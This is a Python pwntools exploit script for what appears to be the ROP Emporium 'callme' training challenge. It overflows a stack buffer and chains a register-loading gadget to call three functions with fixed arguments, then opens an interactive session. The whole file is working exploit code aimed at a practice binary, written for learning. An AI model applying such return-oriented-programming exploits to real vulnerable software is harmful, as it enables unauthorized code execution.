#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

#   Break before read() is called to inspect stack (i.e. find return address/
# amount of junk needed.
gdbscript = '''
break *0x4008db
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()


gadget = p64(0x40093c)          #   Address of gadget, used to pass correct
                                # parameters to each function.  Found with
                                # ROPgadget --binary callme | grep 'pop  rdi'
callMeOne = p64(0x400720)       #   Address of callMeOne
callMeTwo = p64(0x400740)       #   Address of callMeTwo
callMeThree = p64(0x4006f0)     #   Address of CallmeThree
p1 = p64(0xdeadbeefdeadbeef)    #   Parameter one
p2 = p64(0xcafebabecafebabe)    #   Parameter two
p3 = p64(0xd00df00dd00df00d)    #   Parameter three
junk = b'A'*40                  #   Buffer junk

#   rdi, rsi, and rdx are altered during each function call, was necessary to
# call the gadget for each function to pass the proper parameters each time
payload = junk + gadget + p1 + p2 + p3 + callMeOne + gadget + p1 + p2 + p3 + callMeTwo + gadget + p1 + p2 + p3 + callMeThree

log.info(io.clean())
io.sendline(payload)
log.info(io.clean())

io.interactive()

